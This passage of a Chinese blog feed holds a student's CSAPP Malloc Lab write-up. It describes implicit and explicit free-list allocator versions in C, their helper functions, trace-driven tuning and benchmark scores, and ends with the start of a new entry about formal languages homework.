operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  heap_lo <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>CHUNKSIZE <span class="token operator">/</span> WSIZE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>设置  $prologue$ $block$, $epilogue$ $block$.</li><li>用 $CHUNKSIZE$ 大小的 $free$ $block$ 扩展空堆, 若扩展失败则返回 $NULL$.</li></ul><h4 id="mm-malloc-1"><a href="#mm-malloc-1" class="headerlink" title="mm_malloc"></a>mm_malloc</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_malloc</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token class-name">size_t</span> asize<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token comment">/* Adjust block size to include overhead and alignment reqs. */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;=</span> DSIZE<span class="token punctuation">)</span> asize <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> DSIZE<span class="token punctuation">;</span>  <span class="token keyword">else</span> asize <span class="token operator">=</span> DSIZE <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Search the free list for a fit */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">first_fit</span><span class="token punctuation">(</span>asize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment">/* No fit found. Get more memory and place the block */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token function">MAX</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> CHUNKSIZE<span class="token punctuation">)</span> <span class="token operator">/</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将 $size$ 对齐至 $16$ 字节, 并扩展加上 $header$, $footer$.</li><li>首先使用 $first$ $fit$ 策略查询 $free$ $list$, 返回一个指向连续内存块的指针.</li><li>若返回为 $NULL$, 则在该处进行 $extend_heap$.</li></ul><h4 id="mm-free-1"><a href="#mm-free-1" class="headerlink" title="mm_free"></a>mm_free</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">mm_free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token class-name">size_t</span> size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">coalesce</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将 $alloc$ $bit$ 位置 $0$, 并进行 $free$ $block$ 的合并.</li></ul><h4 id="mm-realloc-1"><a href="#mm-realloc-1" class="headerlink" title="mm_realloc"></a>mm_realloc</h4><ul><li>如果 $ptr$ 为 $NULL$, 直接调用 $mm_malloc$. </li><li>如果 $size$ 为 $0$, 直接调用 $mm_free$. </li><li>否则, 直接调用 $mm_malloc$ 分配 $newptr$, 以下同 $Version$ $0$.</li></ul><h3 id="Performance-1"><a href="#Performance-1" class="headerlink" title="Performance"></a>Performance</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Results <span class="token keyword">for</span> mm malloc:trace            name     valid  util     ops      secs   Kops <span class="token number">1</span>     amptjp-bal.rep       <span class="token function">yes</span>   <span class="token number">90</span>%    <span class="token number">5694</span>  <span class="token number">0.001877</span>   <span class="token number">3033</span> <span class="token number">2</span>       cccp-bal.rep       <span class="token function">yes</span>   <span class="token number">92</span>%    <span class="token number">5848</span>  <span class="token number">0.001071</span>   <span class="token number">5459</span> <span class="token number">3</span>    cp-decl-bal.rep       <span class="token function">yes</span>   <span class="token number">94</span>%    <span class="token number">6648</span>  <span class="token number">0.004788</span>   <span class="token number">1389</span> <span class="token number">4</span>       expr-bal.rep       <span class="token function">yes</span>   <span class="token number">96</span>%    <span class="token number">5380</span>  <span class="token number">0.005364</span>   <span class="token number">1003</span> <span class="token number">5</span> coalescing-bal.rep       <span class="token function">yes</span>   <span class="token number">50</span>%   <span class="token number">14400</span>  <span class="token number">0.000173</span>  <span class="token number">83189</span> <span class="token number">6</span>     random-bal.rep       <span class="token function">yes</span>   <span class="token number">90</span>%    <span class="token number">4800</span>  <span class="token number">0.006984</span>    <span class="token number">687</span> <span class="token number">7</span>    random2-bal.rep       <span class="token function">yes</span>   <span class="token number">87</span>%    <span class="token number">4800</span>  <span class="token number">0.006384</span>    <span class="token number">752</span> <span class="token number">8</span>     binary-bal.rep       <span class="token function">yes</span>   <span class="token number">54</span>%   <span class="token number">12000</span>  <span class="token number">0.015309</span>    <span class="token number">784</span> <span class="token number">9</span>    binary2-bal.rep       <span class="token function">yes</span>   <span class="token number">47</span>%   <span class="token number">24000</span>  <span class="token number">0.007432</span>   <span class="token number">3229</span><span class="token number">10</span>    realloc-bal.rep       <span class="token function">yes</span>   <span class="token number">32</span>%   <span class="token number">14401</span>  <span class="token number">0.141429</span>    <span class="token number">102</span><span class="token number">11</span>   realloc2-bal.rep       <span class="token function">yes</span>   <span class="token number">34</span>%   <span class="token number">14401</span>  <span class="token number">0.003931</span>   <span class="token number">3663</span>Total                             <span class="token number">70</span>%  <span class="token number">112372</span>  <span class="token number">0.194743</span>    <span class="token number">577</span>Score <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">42</span> <span class="token punctuation">(</span>util<span class="token punctuation">)</span> + <span class="token number">2</span> <span class="token punctuation">(</span>thru<span class="token punctuation">))</span> * <span class="token number">11</span>/11 <span class="token punctuation">(</span>testcase<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">44</span>/100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>通过了所有测试文件.</p><p>几乎所有测试点的 $Kops$ 均需进行优化, 最后两个测试 $mm_realloc$ 功能点的 $Memory$ $Utilization$ 过低.</p></blockquote><h2 id="Version-2"><a href="#Version-2" class="headerlink" title="Version 2"></a>Version 2</h2><p>采用 $Explicit$ $Free$ $List$ 组织空闲块, 使用的数据结构为 $Double$ $Linked$ $List$.</p><h3 id="Block-Structure-2"><a href="#Block-Structure-2" class="headerlink" title="Block Structure"></a>Block Structure</h3><p>一个 $block$ 的结构被组织为:</p><p><img src="/pic/48.png"></p><p>考虑 $Boundary$ $Tags$ 与 $Alignment$ 条件, 此时 $minimum$ $block$ $size$ 为 $4 * WSIZE,(32,Bytes)$.</p><h3 id="Macros-1"><a href="#Macros-1" class="headerlink" title="Macros"></a>Macros</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* 前/后 block 中 payloader 的起始地址 */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PREV_BLK</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">NEXT_BLK</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HEADER</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/* 前/后 free block 中 payloader 的起始地址 */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PRED_BLK</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">SUCC_BLK</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp <span class="token operator">+</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>模拟了 $Double$ $Linked$ $List$ 的实现.</li><li>$PRED_BLK$, $SUCC_BLK$ 区别于先前定义的 $PREV_BLK$, $NEXT_BLK$, 用于在 $Explicit$ $Free$ $List$ 中进行前后 $free$ $block$ 的标记.</li></ul><h3 id="Helper-Functions-2"><a href="#Helper-Functions-2" class="headerlink" title="Helper Functions"></a>Helper Functions</h3><h4 id="insert-free-block"><a href="#insert-free-block" class="headerlink" title="insert_free_block"></a>insert_free_block</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">insert_free_block</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">PRED_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">SUCC_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">=</span> heap_lo<span class="token punctuation">;</span>  <span class="token function">PRED_BLK</span><span class="token punctuation">(</span>sentinel<span class="token punctuation">)</span> <span class="token operator">=</span> bp<span class="token punctuation">;</span>   heap_lo <span class="token operator">=</span> bp<span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将 $bp$ ( 指向一个 $free$ $block$ ) 插入 $Explicit$ $Free$ $List$ 的尾部作为 $sentinel$.</li></ul><h4 id="remove-free-block"><a href="#remove-free-block" class="headerlink" title="remove_free_block"></a>remove_free_block</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">remove_free_block</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">PRED_BLK</span><span class="token punctuation">(</span><span class="token function">SUCC_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">PRED_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PRED_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">SUCC_BLK</span><span class="token punctuation">(</span><span class="token function">PRED_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">SUCC_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">else</span>    heap_lo <span class="token operator">=</span> <span class="token function">SUCC_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将 $bp$ ( 指向一个被分配的 $block$ ) 从 $Explicit$ $Free$ $List$ 中删除.</li><li>需要检查 $bp$ 是否为 $sentinel$.</li></ul><h4 id="first-fit-1"><a href="#first-fit-1" class="headerlink" title="first_fit"></a>first_fit</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">first_fit</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> asize<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>malloced <span class="token operator">!=</span> asize<span class="token punctuation">)</span> counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>counter <span class="token operator">&gt;=</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    bp <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token function">MAX</span><span class="token punctuation">(</span>asize <span class="token operator">/</span> WSIZE<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> counter<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在 $binary{-}bal.rep$ 与 $binary2{-}bal.rep$ 测试文件中进行了大量相同 $size$ 的 $malloc$ 操作.</p><p>如果重复使用 $first_fit$ 进行检索, 会使 $Kops$ 显著过低.</p></blockquote><ul><li>定义 $malloced$ 为上一次调用 $mm_malloc$ 分配的 $size$ 大小.</li><li>如果重复分配同样 $size$ 的块超过 $48$ 次 ( $48$ 为反复调节获得的最佳参数 ), 则直接调用 $extend_heap$ 将堆扩展相应大小, 不再通过 $first_fit$ 进行检索.</li></ul><h4 id="place-1"><a href="#place-1" class="headerlink" title="place"></a>place</h4><ul><li>若剩余 $payloader$ 需要进行 $split$ 操作, 则先进行 $remove_free_block$, 最后对剩余 $free$ $block$ 进行 $insert_free_block$.</li><li>否则, 直接进行 $remove_free_block$ 并设置 $alloc$ $bit$.</li></ul><h4 id="coalesce-1"><a href="#coalesce-1" class="headerlink" title="coalesce"></a>coalesce</h4><ul><li>仍采用 $immediate$ $coalesce$ 策略.</li><li>在设置 $alloc$ $bit$ 前进行 $remove_free_block$, 最后对合并的 $free$ $block$ 进行 $insert_free_block$.</li></ul><h4 id="extend-heap-1"><a href="#extend-heap-1" class="headerlink" title="extend_heap"></a>extend_heap</h4><ul><li>由于此时 $minimum$ $block$ $size$ 为 $4 * WSIZE$, 将 $size$ 双字对齐后, 若其为 $2 * WSIZE$, 则置为 $4 * WSIZE$.</li></ul><h3 id="Malloc-Functions-2"><a href="#Malloc-Functions-2" class="headerlink" title="Malloc Functions"></a>Malloc Functions</h3><h4 id="mm-init-2"><a href="#mm-init-2" class="headerlink" title="mm_init"></a>mm_init</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">mm_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>$mm_init$ 会调用 $extend_heap$ 预分配一块 $4096,Bytes$ 大小的空间做为起始 $free$ $block$, $mm_malloc$ 在 $List$ 中没有合适 $free$ $block$ 的情况下总会调用 $extend_heap$ 扩展空间, 其大小取 $4096,Bytes$ 与待分配大小中较大者.</p><p>在 $coalescing{-}bal.rep$ 中, 起始分配 $4095,Bytes$ 大小的空间, 经过 $16$ 字节对齐和 $Tag$ 扩展后大于 $4096,Bytes$, 初始的 $4096,Bytes$ 空间永远不会被利用.</p><p>只需修改 $mm_init$ 中 $extend_heap$ 初始扩展大小为 $minimun$ $block$ $size$ 即可.</p></blockquote><ul><li>用 $minimun$ $block$ $size$ ( $4$ ) 大小的 $free$ $block$ 扩展空堆, 若扩展失败则返回 $NULL$.</li></ul><h4 id="mm-realloc-2"><a href="#mm-realloc-2" class="headerlink" title="mm_realloc"></a>mm_realloc</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">mm_free</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>   <span class="token class-name">size_t</span> oldsize <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HEADER</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">size_t</span> newsize <span class="token operator">=</span> size <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>newsize <span class="token operator">&lt;=</span> oldsize<span class="token punctuation">)</span> <span class="token keyword">return</span> bp<span class="token punctuation">;</span>   <span class="token class-name">size_t</span> next_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HEADER</span><span class="token punctuation">(</span><span class="token function">NEXT_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">size_t</span> asize <span class="token operator">=</span> oldsize <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HEADER</span><span class="token punctuation">(</span><span class="token function">NEXT_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>next_alloc <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>asize <span class="token operator">&gt;=</span> newsize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token function">remove_free_block</span><span class="token punctuation">(</span><span class="token function">NEXT_BLK</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HEADER</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FOOTER</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> bp<span class="token punctuation">;</span>   <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token operator">*</span>newbp <span class="token operator">=</span> <span class="token function">mm_malloc</span><span class="token punctuation">(</span>newsize<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">place</span><span class="token punctuation">(</span>newbp<span class="token punctuation">,</span> newsize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>newbp<span class="token punctuation">,</span> bp<span class="token punctuation">,</span> newsize<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">mm_free</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> newbp<span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>原始的 $mm_realloc$ 没有考虑被分配块前后 $free$ $block$ 的情况, 以及 $new$ $block$ $size$ 和 $old$ $block$ $size$ 的比较, 需对此进行优化.</p></blockquote><ul><li>如果 $size$ 为 $0$, 直接调用 $mm_free$. </li><li>如果 $new$ $block$ $size$ 不大于 $old$ $block$ $size$, 直接返回原指针 $bp$ 即可.</li><li>否则, 需要考察后面邻块.<ul><li>若其未分配, 且 $size$ 和不小于 $newsize$, 则直接合并两个 $free$ $block$ 即可.</li><li>否则, 需通过 $mm_malloc$ 分配 $new$ $block$, 并进行内存 $memcpy$.</li></ul></li></ul><h3 id="Performance-2"><a href="#Performance-2" class="headerlink" title="Performance"></a>Performance</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Results <span class="token keyword">for</span> mm malloc:trace            name     valid  util     ops      secs   Kops <span class="token number">1</span>     amptjp-bal.rep       <span class="token function">yes</span>   <span class="token number">88</span>%    <span class="token number">5694</span>  <span class="token number">0.000291</span>  <span class="token number">19594</span> <span class="token number">2</span>       cccp-bal.rep       <span class="token function">yes</span>   <span class="token number">86</span>%    <span class="token number">5848</span>  <span class="token number">0.000208</span>  <span class="token number">28142</span> <span class="token number">3</span>    cp-decl-bal.rep       <span class="token function">yes</span>   <span class="token number">94</span>%    <span class="token number">6648</span>  <span class="token number">0.000386</span>  <span class="token number">17214</span> <span class="token number">4</span>       expr-bal.rep       <span class="token function">yes</span>   <span class="token number">96</span>%    <span class="token number">5380</span>  <span class="token number">0.000287</span>  <span class="token number">18739</span> <span class="token number">5</span> coalescing-bal.rep       <span class="token function">yes</span>   <span class="token number">98</span>%   <span class="token number">14400</span>  <span class="token number">0.000202</span>  <span class="token number">71111</span> <span class="token number">6</span>     random-bal.rep       <span class="token function">yes</span>   <span class="token number">88</span>%    <span class="token number">4800</span>  <span class="token number">0.000645</span>   <span class="token number">7442</span> <span class="token number">7</span>    random2-bal.rep       <span class="token function">yes</span>   <span class="token number">85</span>%    <span class="token number">4800</span>  <span class="token number">0.000747</span>   <span class="token number">6429</span> <span class="token number">8</span>     binary-bal.rep       <span class="token function">yes</span>   <span class="token number">54</span>%   <span class="token number">12000</span>  <span class="token number">0.000393</span>  <span class="token number">30519</span> <span class="token number">9</span>    binary2-bal.rep       <span class="token function">yes</span>   <span class="token number">47</span>%   <span class="token number">24000</span>  <span class="token number">0.000480</span>  <span class="token number">50042</span><span class="token number">10</span>    realloc-bal.rep       <span class="token function">yes</span>   <span class="token number">86</span>%   <span class="token number">14401</span>  <span class="token number">0.000233</span>  <span class="token number">61754</span><span class="token number">11</span>   realloc2-bal.rep       <span class="token function">yes</span>   <span class="token number">17</span>%   <span class="token number">14401</span>  <span class="token number">0.000186</span>  <span class="token number">77383</span>Total                             <span class="token number">76</span>%  <span class="token number">112372</span>  <span class="token number">0.004058</span>  <span class="token number">27692</span>Score <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">46</span> <span class="token punctuation">(</span>util<span class="token punctuation">)</span> + <span class="token number">40</span> <span class="token punctuation">(</span>thru<span class="token punctuation">))</span> * <span class="token number">11</span>/11 <span class="token punctuation">(</span>testcase<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">86</span>/100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h2><ul><li>$Malloc$ $Lab$ 需要用心 $DEBUG$, 并考验 $gdb$ 的使用掌握. </li><li>我从最简单的实现 —— $Implicit$ $Free$ $List$ 开始, 最后选择了 $Explicit$ $Free$ $List$ 进行实现. </li><li>根据不同 $trace$ 的组成, 我进行了分析与优化, 与 $Segmentation$ $Fault$ 日夜作战. </li><li>这次 $Lab$ 确实是对我的一次难得的体验!</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业11</title>
      <link href="/42/"/>
      <url>/42/</url>
      
